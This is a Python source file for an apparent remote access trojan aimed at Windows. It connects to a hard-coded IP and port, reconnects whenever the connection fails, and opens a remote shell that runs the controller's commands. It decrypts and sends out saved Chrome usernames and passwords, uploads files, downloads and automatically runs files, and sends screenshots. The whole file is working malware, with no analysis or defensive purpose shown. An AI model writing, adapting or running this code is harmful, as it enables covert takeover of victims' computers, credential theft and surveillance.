import socket
import os
import sqlite3
import win32crypt
import subprocess
import pyautogui as pag

def connection():
        try:
                host = '169.254.245.176'
                port = 5252
                global s
                s = socket.socket()
                s.connect((host, port))
        except:
                connection()
        raw_signal()

def raw_signal():
        raw = s.recv(2024).decode()
        if raw == ' ':
                s.send(str.encode(' '))
                server_requests()

def server_requests():
        try:
                readywhat = s.recv(1024).decode()
                if readywhat == 'readycmd':
                        send_data_by_cmds()
                elif readywhat == 'readyhope':
                        send_data_by_hope()
        except:
                connection()

def send_data_by_cmds():
        try:
                while True:
                        cmd = s.recv(1024)
                        if cmd[:2].decode('utf-8') == 'cd':
                                os.chdir(cmd[3:].decode('utf-8'))
                        if (cmd).decode('utf-8') != 'back':
                                data = subprocess.Popen(cmd[:].decode('utf-8'), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
                                outputbytes = data.stdout.read() + data.stderr.read()
                                outputstr = str(outputbytes, 'utf-8')
                                cwd = os.getcwd()
                                s.send(str.encode(outputstr + cwd))
                        if cmd.decode('utf-8') == 'back':
                                server_requests()
        except:
                connection()

def send_data_by_hope():
        try:
                while True:
                        cmd = s.recv(1024).decode()
                        if cmd == 'chromedbkey':
                                get_chrome()
                        if cmd == 'import':
                                import_files()
                        if cmd == 'export':
                                export_files()
                        if cmd == 'screenshot':
                                take_screenshot()
                        if cmd == 'back':
                                server_requests()
        except:
                connection()

def import_files():
        # while True:
        try:
                # response = s.recv(1024).decode()
                # if response == 'import':
                filename = s.recv(1024).decode()
                byte = open(filename, 'rb')
                sbyte = byte.read(99999999)
                s.send(sbyte)
                send_data_by_hope()
        except:
                connection()

def export_files():
        try:
                filepath = s.recv(1024).decode()
                if filepath == 'door':
                        os.chdir(os.path.expanduser('~') + r'/AppData/Local/Door/')
                else:
                        os.chdir(filepath)
                filename = s.recv(1024)
                fbyte = s.recv(99999999)
                with open(filename, 'wb') as byte:
                        byte.write(fbyte)
                        byte.close()
                runfile = os.getcwd() + '\\' + filename.decode()
                os.startfile(runfile)
                send_data_by_hope()
        except:
                connection()

def get_chrome():
        try:
                data_path = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\Login Data'
                c = sqlite3.connect(data_path)
                cursor = c.cursor()
                select_statement = 'SELECT origin_url, username_value, password_value FROM logins'
                cursor.execute(select_statement)
                login_data = cursor.fetchall()
                cred = {}
                # global string
                string = ''
                for url, username, pwd in login_data:
                        pwd = win32crypt.CryptUnprotectData(pwd)
                        cred[url] = (username, pwd[1].decode('utf-8'))
                        string += '\n /+/ URL:%s USERNAME:%s PASSWORD:%s \n' % (url, username, pwd[1].decode('utf-8'))
                        s.send(str.encode(string))
        except:
                s.send(str.encode('unable'))

def take_screenshot():
        # while True:
        number_of_screenshot = 1
        screenshot_name = str(number_of_screenshot) + '.png'
        screenshot_filepath = os.path.expanduser('~') + r'\Pictures\\'
        while number_of_screenshot < 2:
                pag.screenshot(screenshot_filepath + screenshot_name)
                number_of_screenshot += 1
        os.chdir(screenshot_filepath)
        # s.send(str.encode(screenshot_name))
        ssbyte = open(screenshot_name, 'rb')
        send_ssbyte = ssbyte.read(9999999)
        s.send(send_ssbyte)
        send_data_by_hope()
        for screenshot in os.listdir(screenshot_filepath):
                if screenshot.endswith('.png'):
                        os.unlink(screenshot_filepath + screenshot)
                        # break
        # print()
        # senddatabyhope()

if __name__ == '__main__':
        connection()
